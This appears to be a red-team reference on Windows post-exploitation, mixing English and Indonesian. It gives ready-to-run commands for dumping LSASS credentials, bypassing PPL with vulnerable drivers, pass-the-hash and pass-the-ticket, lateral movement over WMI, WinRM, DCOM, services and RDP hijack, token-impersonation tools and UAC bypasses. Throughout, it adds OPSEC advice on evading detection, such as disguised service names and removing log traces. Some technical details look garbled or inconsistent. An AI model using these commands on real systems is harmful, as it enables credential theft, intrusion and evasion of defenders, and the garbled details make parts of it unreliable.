# postex-win — win

# Windows Post-Exploitation — Red Team Reference

## 1. Akses LSASS

### 1.1 comsvcs.dll MiniDump (LOLBAS, T1003.001)

Sending: `rundll32` call to the `MiniDump` export in `C:\Windows\System32\comsvcs.dll`, writing the dump to an attacker-writable path.

```cmd
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

PowerShell variant (often more OPSEC-safe because it doesn't spawn a new console window):

```powershell
$p = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $p C:\Windows\Temp\lsass.dmp full
```

What shows up:
- `rundll32.exe` child of `cmd.exe`/`powershell.exe` — an anomaly because `rundll32` with the `comsvcs.dll, MiniDump` argument is a classic signature.
- Sysmon EID 1 (process create) with `CommandLine` containing `MiniDump`.
- Sysmon EID 11 (file create) `lsass.dmp`.
- Defender ASR rule **"Block credential stealing from lsass.exe"** (GUID `9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2`) blocks this since Defender 4.18 (2020). On Windows 11 24H2 it's default-enabled.

Why it fails:
- `comsvcs.dll` in `System32` is owned by `TrustedInstaller`; ATT&CK notes that if the binary is copied (to avoid the signature) it instead gets detected as unsigned.
- Requires `SeDebugPrivilege` — from medium-integrity non-admin it's immediately `Access Denied` on `OpenProcess(PROCESS_VM_READ)`. From admin without PPL bypass, `lsass.exe` PPL (RunAsPPL) blocks `MiniDumpWriteDump` even with a valid handle.

### 1.2 Handle steal (duplicate handle via `NtDuplicateObject`)

Sending: a medium-integrity process opens a handle to `lsass.exe` from a process that already has an LSASS handle (e.g. `svchost.exe`/`wininit.exe`) and then duplicates it. Common tooling: `SysWhispers3`/`InlineWhispers` + custom loader, or `SharpDump`/`SafetyKatz` variants.

```c
// pseudo — open wininit.exe, find process handle to lsass in its handle table
// enumerate handles (NtQuerySystemInformation SystemHandleInformationEx)
// NtDuplicateObject(wininit, lsassHandle, self, &myHandle, PROCESS_VM_READ, 0, 0)
```

What shows up:
- Handle enumeration syscall (`NtQuerySystemInformation` class `SystemExtendedHandleInformation`) — ETW Microsoft-Windows-Kernel-Process EID 2/3 or Sysmon 8 (CreateRemoteThread) doesn't catch this directly, but **Defender for Endpoint** sensors `OpenProcess` to `lsass.exe` from non-allowlisted processes.
- If duplication succeeds, `MiniDumpWriteDump` no longer needs `SeDebugPrivilege` in the caller — but it needs a `PROCESS_QUERY_INFORMATION` handle.

Why it fails in the field:
- LSASS PPL: handle duplication gives `PROCESS_VM_READ` but `MiniDumpWriteDump` still hits PPL. Handle dup is not a PPL bypass — it's only a privilege bypass.
- Modern EDR (CrowdStrike Falcon 7.x, SentinelOne Singularity 24.x) hooks `NtDuplicateObject` in userland and blocks `wininit`/`svchost` as source handles.

### 1.3 PPL bypass (LSASS)

Sending: one of —
- **Driver vulnerable** (`mimikatz` `!+` + `mimidrv.sys` memakai `PsProtection` patch via arbitrary kernel write). Signature `mimidrv.sys` diblokir DriverBlocklist (Windows 11 24H2 punya blocklist baru Sep 2025 menambah `mimidrv`, `gdrv`, `ene.sys`).
- **BYOVD** (Bring Your Own Vulnerable Driver): `RTCore64.sys` (MSI Afterburner, CVE-2019-16098), `gdrv.sys` (Gigabyte), `ene.sys` (ASUS ARMOURY), `WDTKernel.sys`. Windows 11 24H2 with HVCI enabled refuses to load unsigned/vulnerable drivers.
- **PPLdump** (itm4n, `NtCreateUserProcess` + `SePrivilege` abuse technique via `WinTrust` on Windows < 24H2). Patched in Windows 11 build 260xx.
- **SilentMoonwalk / Callback Hell** — stack spoofing to call `MiniDumpWriteDump` with the stack returning to a legitimate `kernel32`.

```cmd
:: BYOVD contoh RTCore64
sc create RTCore64 type= kernel binPath= C:\Windows\Temp\RTCore64.sys
sc start RTCore64
:: lalu exploit arbitrary R/W untuk clear PsProtection flags di EPROCESS lsass
```

What shows up:
- Event Log **Service Control Manager EID 7045** (service install) — `ImagePath` in `\Temp\` = high-fidelity red flag.
- Sysmon EID 6 (driver load) with `Signed` true but `SignatureStatus` valid and the driver name not in the Microsoft driver store (`C:\Windows\System32\drivers\`).
- Defender `BlockNonMicrosoftDrivers` / HVCI violation event.

Why it fails:
- Windows 11 24H2 with **Smart App Control** + **HVCI** + **Driver Blocklist** by default refuses RTCore64, gdrv, ene.
- `RunAsPPL=1` in the registry `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` is only effective after a reboot; admins who just enabled it sometimes forget to reboot — so lab OK, production the opposite.
- Credential Guard (VBS) protects **LSA secrets and NTLM hashes** with virtualization — PPL bypass gives access to LSASS memory, but the hashes are in a format that can't be directly used for PtH because they're protected by VSM. So the dump "succeeds" but the hashes are unusable.

---

## 2. Pass-the-Hash / Pass-the-Ticket / Over-Pass-the-Hash

### 2.1 PtH — NTLM

Sending: NT hash (`aad3b435…:31d6cfe0…`), auth via SMB/WMI/WinRM without plaintext.

```cmd
:: impacket
python examples/psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/Administrator@10.0.0.10

:: mimikatz
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe
```

What shows up:
- Event **4624 logon type 3** with `AuthenticationPackage: NTLM`, `LogonProcess: NtLmSsp`. `Workstation Name` = attacker host.
- **4776** (credential validation) bila DC.
- **4672** if admin — but without 4648 (explicit cred) because it's not explicit.
- Defender for Identity / MDI alert **"Pass-the-hash"** — anomaly baseline: NTLM auth from a host that usually uses Kerberos.

Why it fails:
- **NTLM disabled** in the domain (Windows 11 24H2 / Server 2025 baseline starts disabling NTLMv1, many orgs disable NTLM entirely). All classic PtH techniques die.
- **Protected Users** group member: NTLM auth is refused, PtH not possible.
- **Credential Guard** on the target: hashes from the target's LSASS are useless for lateral movement, only at the source.

### 2.2 Over-Pass-the-Hash (OPtH) — NTLM → Kerberos TGT

Sending: NT hash, request TGT with `AS-REQ` using RC4-HMAC (etype 0x17) without plaintext.

```cmd
:: impacket
python examples/getTGT.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/Administrator

:: Rubeus (opsec: /opsec flag untuk hindari AS-REQ dengan encryption downgrade)
Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /domain:corp.local /dc:dc01.corp.local /ptt /opsec
```

What shows up:
- DC **4768** (TGT issued) with `Ticket Encryption Type 0x17` (RC4) even though the domain default is AES256.
- MDI alert **"Overpass-the-hash"** — combination of 4768 (RC4) + login from a non-baseline host.
- 4624 type 3 on the target with Kerberos (not NTLM) — often missed by NTLM-only detection.

Why it fails:
- Domains that **disable RC4** (`msDS-SupportedEncryptionTypes` forced AES-only on all accounts) — RC4 `getTGT` is refused with `KDC_ERR_ETYPE_NOTSUPP`.
- `getTGT` without `/opsec` in Rubeus sends `AS-REQ` without `preauth` — triggers **4768 with status `0x18` (pre-auth required)** = noise > 100x baseline.
- **AS-REP roasting detection** in RBC baseline treats high-volume RC4 AS-REQ as kerberoasting.

### 2.3 Pass-the-Ticket

Sending: `.kirbi` (Windows LSA format) or `.ccache` (MIT/Heimdal).

```cmd
:: Rubeus
Rubeus.exe ptt /ticket:doIF...base64...

:: impacket
export KRB5CCNAME=/tmp/administrator.ccache
python examples/psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

What appears:
- **4769** (TGS) from a host with `Client Address` = attacker. No 4768 → TGT "appears from nowhere".
- **4624 type 3** Kerberos without a corresponding 4768 on the DC.
- MDI: **"Suspicious Kerberos ticket"** heuristic (`Kerberos ticket lifetime` > default, or forwardable TGT with `RenewUntil` > 7d).

Why it fails:
- **PAC validation** on the target (Server 2022+ `PacRequestorEnforcement=2`) — a ticket with a forged PAC signature (golden/sapphire) is rejected for strict services.
- Ticket expired — default `.kirbi` is 10 hours; post-exploitation after 4 hours often misses the TTL.
- AES vs RC4 mismatch: a user with `AES-only` in the domain cannot use an RC4 `.kirbi` on a target that enforces AES (Server 2025).

---

## 3. Lateral Movement

### 3.1 WMI (T1047)

```cmd
wmic /node:10.0.0.20 /user:CORP\Administrator /password:xxx process call create "cmd.exe /c whoami > C:\Windows\Temp\o.txt"
```
PowerShell:
```powershell
Invoke-WmiMethod -ComputerName 10.0.0.20 -Class Win32_Process -Name Create -ArgumentList "cmd /c calc"
```

Muncul:
- **4688** on the target: `WmiPrvSE.exe` spawning `cmd.exe` — parent WmiPrvSE = red flag.
- **4624 type 3** (`AuthenticationPackage: NTLM|Kerberos`), `RemoteInteractive` logon does not — WMI = Network.
- Sysmon EID 1 parent `WmiPrvSE.exe` child `cmd.exe`/`powershell.exe`.
- **Windows Defender for Endpoint**: alert "Suspicious WMI execution".

Fails if: firewall blocks RPC dynamic ports (135 + 49152-65535 range), WinRM is separate, or `WmiPrvSE` is disabled via AppLocker policy.

### 3.2 WinRM (T1021.006)

```powershell
$c = New-PSSession -ComputerName 10.0.0.20 -Credential (Get-Credential)
Invoke-Command -Session $c -ScriptBlock { whoami }
```
Impacket alternatif:
```cmd
evil-winrm -i 10.0.0.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

Muncul:
- **4624 type 3** on the target, `AuthenticationPackage: Negotiate`, `Network` logon with `ProcessName: C:\Windows\System32\wsmprovhost.exe`.
- **91** (WinRM Operational) on the target: `Creating WSMan shell`.
- **4688**: `wsmprovhost.exe` spawn `cmd.exe`/`powershell.exe` — sekuens klasik PSRemoting.
- Defender for Endpoint: "WinRM remote execution".

Fails: WinRM HTTP (5985) or HTTPS (5986) not listening (enabled by default since Server 2012, **disabled on Windows 10/11 client**). Kerberos double-hop — `Invoke-Command` to host A cannot authenticate to host B without CredSSP/delegation.

### 3.3 DCOM (T1021.003)

```powershell
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.0.0.20"))
$c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
```
Varian: `ShellWindows`, `ShellBrowserWindow`, `Excel.Application.DDE`, `Visio.Application`.

Muncul:
- **4624 type 3** on the target, `Network` logon.
- **4688**: parent = `svchost.exe` (`DcomLaunch`) → `mmc.exe` → `cmd.exe`.
- DCOM EID? None native — Sysmon 1 + 3 (network) correlation.
- MDI "Remote DCOM execution" when RPC to port 135 from the host is correlated.

Fails: DCOM RPC endpoint mapper (135) + dynamic port range blocked. Target with **AppContainer** policy blocks PROGID (Windows 11 24H2 default is stricter for non-interactive). Excel/Office not installed.

### 3.4 SCMR (service creation, T1543.003)

```cmd
sc \\10.0.0.20 create RedTeam binPath= "cmd.exe /c whoami > C:\Windows\Temp\o.txt" start= demand
sc \\10.0.0.20 start RedTeam
sc \\10.0.0.20 delete RedTeam
```
Impacket `smbexec.py` uses this technique (service `BTOBTO`/`BTOBTO.svc`).

Muncul:
- **7045** in the target's `System.evtx`: `A service was installed` + random `ServiceName` + `ImagePath` `cmd.exe /c ...` or `%COMSPEC%`.
- **4697** in Security.evtx (requires audit policy `Audit Security System Extension`).
- **4688**: `services.exe` spawn `cmd.exe` — child of services.exe = eksekusi service.
- **4624 type 3** for SMB auth. Type 5 (service) for the service logon account.

Fails: non-admin cannot create a service (`SC_MANAGER_CREATE_SERVICE`). AppLocker + WDAC block `cmd.exe` as a service child. Defender ASR rule "Block process creations originating from PSExec and WMI commands" (GUID `d1e49aac-…`) blocks parent `PSEXESVC.exe`/`WmiPrvSE.exe`.

### 3.5 RDP hijack (T1563.002)

Two techniques:

**(a) Session hijack via `tscon`** — requires SYSTEM or `SeTcbPrivilege`:
```cmd
query user
tscon 2 /dest:rdp-tcp#3
```
Run as SYSTEM (e.g. from a service SCMR commute) to detach the active user session into the attacker's session.

**(b) RDP shadow / thin client**:
```cmd
mstsc /shadow:2 /control /v:10.0.0.20
```

Muncul:
- **1149** (TerminalServices-RemoteConnectionManager): user auth.
- **4624 type 10** (`RemoteInteractive`) and **4778**/**4779** (session reconnect/disconnect).
- **Event 25** (TerminalServices-LocalSessionManager) for reconnect.
- **RDP shadow event** `TerminalServices-RemoteConnectionManager/Operational EID 258` (`ShadowViewerConnection`).

Fails: `tscon` requires the session to have a logged-out user, or the attacker's target session lacks privileges. RDP shadow requires **GPO `Shadow` policy allow** (`Disconnected Session Shadowing`) — default `No` on Windows 11 24H2.

---

## 4. Token Impersonation

Delivering: duplicate a token from a SYSTEM process (`winlogon.exe`, `services.exe`) or from an LSASS handle, set `SeImpersonatePrivilege` (default for service accounts, `IIS APPPOOL`, `MSSQL$`, `LOCAL SERVICE`).

Tools: `PrintSpoofer` (spoolsv, Windows 10 1903-22H2), `RoguePotato`/`JuicyPotato` (DCOM OXID resolver — patched on Server 2019 1809+/Win10 1909), `GodPotato` (COM `IFileSystem` abuse, works on Server 2022/2025), `SigmaPotato`, `SharpEfsPotato` (EFSRPC). For credentials (not tokens): `SharpToken` + `SetThreadToken`.

```cmd
:: PrintSpoofer (Win10 22H2, Server 2019)
PrintSpoofer.exe -i -c "cmd.exe"
:: GodPotato (Server 2022 / 2025)
GodPotato.exe -cmd "cmd /c whoami /priv"
```

Muncul:
- `seclogo` / `SeImpersonatePrivilege` in the token — baseline: only service accounts.
- **4688** new child process with a service process as parent (`spoolsv.exe` → `cmd.exe` is a red flag because `spoolsv` does not spawn a shell).
- **4624 type 5** (service logon) when a SYSTEM token is impersonated + **4672** (special privileges) on the target.
- **ETW / Defender**: "Suspicious token impersonation".

Fails: `SeImpersonatePrivilege` absent (interactive admin, non-service). The named pipe is created successfully but `ImpersonateNamedPipeClient` returns `ERROR_INVALID_HANDLE` if the client is not in the same context. `PrintSpoofer` patched on Windows 11 22H2+ (spoolsv no longer reachable via named pipe from medium integrity). `RoguePotato` requires port 135 loopback + points to the attacker host (many internal firewalls block it).

---

## 5. UAC Bypass (state 2026, Windows 11 24H2/25H2)

Many old techniques are **dead** due to patches and 24H2 default policy.

| Technique | Status Win11 24H2/25H2 | Notes |
|---|---|---|
| `fodhelper.exe` (registry hijack `ms-settings\shell\open\command`) | **Dead** since 22H2 (fix `HKCU\Software\Classes`) | ATP/Defender trigger |
| `computerdefaults.exe` | **Mati** 22H2 | |
| `sdclt.exe` (fileless) | **Mati** 21H2 | |
| `eventvwr.exe` (mscfile hijack) | **Mati** 1803+ | |
| `cmstp.exe` INF | **Mati** 21H2 | |
| `ICMLuaUtil` COM (`CLSID {6EDD6D74-C007-4E75-B76A-E5740995E24C}`) | **Works** on 24H2 via `CMSTPLUA.dll` custom loader (unpatched) | requires COM marshaling, high-signal |
| **UACME `akagi`/`mockdir` helper** (env var `windir` + copy DLL) | **Works** depending on build in the hfiref0x/UACME repo | requires a writable dir in System32 shares |
| **`FodHelper` via `\Schedule\TaskCache`** | **Mati** Integrity level fix | |
| **SspiUacBypass** (RPC to `lxsstools` `SspiCaptureCreds`) | **Dead** 22H2 | |
| **`Shim` AppInfo (`Yamato`)** | **Mati** — CVE-2021-1732 fix | |
| **`Startup` folder symlink** | Butuh admin-level write first | |

Techniques still **alive in 2026** and in use:

**a. ICMLuaUtil COM** (unpatched, butuh `Bypass` loader):
```c
// CLSID_CMSTPLUA, IID_ICMLuaUtil
// CoCreateInstance → ICMLuaUtil::ShellExec("cmd.exe", ...)
```
Appears: `dllhost.exe` (COM surrogate) spawning elevated `cmd.exe`; parent `svchost.exe` from DcomLaunch → `dllhost.exe`. Sysmon EID 1 parent `dllhost.exe` + `IntegrityLevel: High` = red flag.

**b. `sdclt`+`ShellExec` via `DelegateExecute`** is still partial in some 24H2 builds — **unreliable** because `sdclt` is removed from some SKUs (Windows 11 Home 24H2).

**c. `wusa.exe` / `pkgmgr.exe` DLL side-load** — butuh writable path.

**d. via SMB `\\127.0.0.1\C$\` mount + MUI** — butuh SMB loopback, banyak org blokir.

Opsec aggregate notes:
- All UAC bypass triggers **Sysmon 1 non-standard parent** (`dllhost.exe`, `consent.exe`, `rundll32.exe`) → elevated shell.
- **Windows 11 24H2 default** `EnableLUA=1`, `ConsentPromptBehaviorAdmin=5` (Prompt for consent), `PromptOnSecureDesktop=1` — bypass still works because of COM auto-elevate.
- **Windows 11 25H2** (Q4 2025) tightens `types of autoElevate` — only COM CLSIDs in the `CoCreateInstance` allowlist from non-elevated if `TE` is not requested; the ICMLuaUtil technique **still** works but must go via `ICMLuaUtil` which is indeed allowlisted auto-elevate. Build-dependent, test on the target VM first.

---

## 6. OPSEC per Technique — Summary Table

| Technique | Noisiest artifact | OPSEC mitigation |
|---|---|---|
| comsvcs MiniDump | Sysmon 1 + `lsass.dmp` path | Write to a non-`C$` `\\127.0.0.1` share or named pipe; `MiniDump` from a **process that already has a handle** to LSASS (via duplicate handle) → does not require `SeDebugPrivilege` |
| Handle steal | `NtQuerySystemInformation` high-volume (Sysmon 22 does not cover, but EDR hooks) | Batch enumeration, delay jitter, use `SystemExtendedHandleInformation` once |
| PPL bypass | 7045 driver load | BYOVD only on hosts without HVCI/DriverBlocklist (check `msinfo32` → `Virtualization-based security: Not enabled`) |
| PtH | 4624 type 3 NTLM | Prefer OPtH to Kerberos; avoid SMB if NTLM is monitored; use WinRM (Kerberos) |
| OPtH | 4768 RC4 | `/opsec` in Rubeus, or **`/aes256:<aes>`** from `sekurlsa::ekeys` so it uses AES (does not trigger RC4 alert) |
| PtT | 4769 without 4768 | Request a new TGT with `/ptt` at the same time, avoid ticket lifetime > default |
| WMI | 4688 parent `WmiPrvSE` | Use `wmic process call create` with a signed binary (`rundll32`/`mshta`) or directly to `CScript` — still high-signal |
| WinRM | `wsmprovhost` spawns shell | `Invoke-Command` directly to `powershell -enc` payload; consider **WinRM + JEA bypass** |
| DCOM | Parent `svchost.exe` → `mmc.exe` | Use a common PROGID (Excel is not present). Parent is usually `svchost` (DcomLaunch) — avoid |
| SCMR | 7045 + 4688 services.exe child | Use a service name that resembles a system one (`WindowsDefendr` not `RedTeam`), delete after execution |
| RDP hijack | 4778/4779 + 1149 | Execute via a one-shot SYSTEM service, `tscon` directly to an uncontrolled session, remove traces in `TerminalServices-RemoteConnectionManager` |
| Token impersonate | parent service spawns shell | target a plausible parent (e.g. `spoolsv` spawning `rundll32` with a signed DLL) |
| UAC bypass | parent `dllhost`/`consent` → high integrity shell | `ICMLuaUtil` from a process that is already high-integrity (not from medium) to avoid consent log |

---

## 7. Operational Pitfalls (field-notes)

1. **`SeDebugPrivilege` is not a guarantee for dumping.** On Windows 11 24H2 with `RunAsPPL=1` + **HVCI**, `MiniDumpWriteDump` from a non-PPL admin still returns `0x80070005` even with a valid handle. Check `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` and `msinfo32` VBS status first before choosing a method.

2. **comsvcs.dll path.** `C:\Windows\System32\comsvcs.dll` is the correct path — but if the shell is 32-bit (`SysWOW64`) on a 64-bit OS, 32-bit `rundll32` fails to call WOW64 `comsvcs.dll, MiniDump` due to the architecture difference with LSASS (64-bit). **Always call from 64-bit `C:\Windows\System32\rundll32.exe`**.

3. **NTFS alternate data stream blocks.** Some orgs have EDR that blocks `CreateFile` writes to `C$` share / `\Temp\` with `0x80070005` — not all failures are visible, just waiting for the EDR verdict.

4. **RC4 vs AES in modern domains.** 2026 baseline: many domains use `msDS-SupportedEncryptionTypes=0x18` (AES+RC4) but have an `AES-only` account policy for admins. If `sekurlsa::ekeys` returns an empty `aes256` and only `rc4`, the domain has RC4 active but the account is protected → OPtH succeeds **only for service accounts**, admins fail with `KDC_ERR_ETYPE_NOTSUPP`.

5. **PtH to WinRM does not work.** WinRM defaults to `Negotiate` (Kerberos first, NTLM fallback) but the `WinRM` service on Windows 11 client **is not listening**. `evil-winrm -H` to a Windows 11 client = connection refused until `Enable-PSRemoting -Force` is run (requires admin).

6. **WMI RPC dynamic ports.** Impacket `wmiexec.py` needs port 135 + dynamic range (`49152-65535`). Windows Firewall default opens 135, but does not open the dynamic range unless `RpcSs` is listening. Many corporate images use `Firewall rule: Block inbound RPC dynamic`. Test `rpcdump.py @target` first; if the `ncacn_ip_tcp` endpoint mapper is open but the dynamic port is closed → WMI is dead, move to SMB.

7. **RDP hijack without `query user` output.** If the attacker does not have `SeTcbPrivilege` (medium integrity), `tscon` will return `Access is denied` **after** the command is logged in Event 4778 → noise. Run `tscon` from SYSTEM (via SCMR / local PsExec), not from an interactive shell.

8. **UAC bypass is build-sensitive.** The `ICMLuaUtil` CLSID `{6EDD6D74-C007-4E75-B76A-E5740995E24C}` depends on `CMSTPLUA.dll` — on Windows 11 Home 24H2 (not Pro), `CMSTPLUA` is not installed until Microsoft Store installs `VCLibs` — the bypass fails with `REGDB_E_CLASSNOTREG`. Test the CLSID with `oleview` before the payload.

9. **`Win32_Process::Create` does not inherit the admin token from the WMI caller.** WMI on a remote host runs as the user that authenticates to SMB/WMI — if that is `DOMAIN\user`, the child is `DOMAIN\user`, not SYSTEM. For SYSTEM use a service (`smbexec`) or a Scheduled Task with `/RU SYSTEM`.

10. **`tscon` dest name.** The destination format `rdp-tcp#N` is **per-host**, not universal; attackers often mistype it → the session isn't hijacked, but instead the active user is **disconnected** (making the user report it to IT). Always `query session` and use the exact name (`console`, `rdp-tcp#0`, `rdp-tcp#1`).

11. **TGT `.kirbi` archived on disk.** `ptt /ticket:` in Rubeus stores the base64 on the commandline — Sysmon 1 captures it in full. Always use `ptt /ticket:@C:\path\file.kirbi` or `Rubeus ptt /ticket` via pipe/stdin.

12. **`Overpass-the-hash` on a host with Credential Guard.** CG blocks `sekurlsa::ekeys` from getting the AES key from memory — if the source target (the host the attacker logged into) has CG, OPtH can't be done from there. Get the hash from the DC or from a non-CG host (e.g., an old Server 2016).

13. **PtH blocked by `LmCompatibilityLevel`.** Domain functional level 2016+ and `LmCompatibilityLevel>=3` disable NTLMv1; the NT hash can still do NTLMv2 — only the NTLMv1 response is dead. However, the `Restrict NTLM` policy (`Network security: Restrict NTLM`) blocks all NTLM auth from certain hosts → PtH returns `STATUS_LOGON_FAILURE` without a 4624.

14. **`PrintSpoofer` needs `spoolsv` running.** Windows 11 24H2 with `Print Spooler` disabled (default policy in Server 2025 for non-print servers) → `PrintSpoofer` returns a `CreateNamedPipe` delay → hang. Check `Get-Service Spooler -ComputerName` first; if stopped, use `GodPotato` (COM) or `EfsPotato` (EFSRPC) as a fallback — but EFSRPC is patched in Windows 11 22H2+.

15. **LSASS dump with forwarded handles.** `MiniDumpWriteDump` from an old version of `dbghelp.dll` has a bug — if `lsass.exe` has > 1000 handles, the internal `NtQuerySystemInformation` function times out and the dump is truncated (hashes incomplete → `sekurlsa` parse fails). Use `MiniDumpNormal` or `MiniDumpWithFullMemoryIdInfo` and verify in `mimikatz` (the parse must return NTLM for every user, not 0 lines).

---

## [reasoning trace]


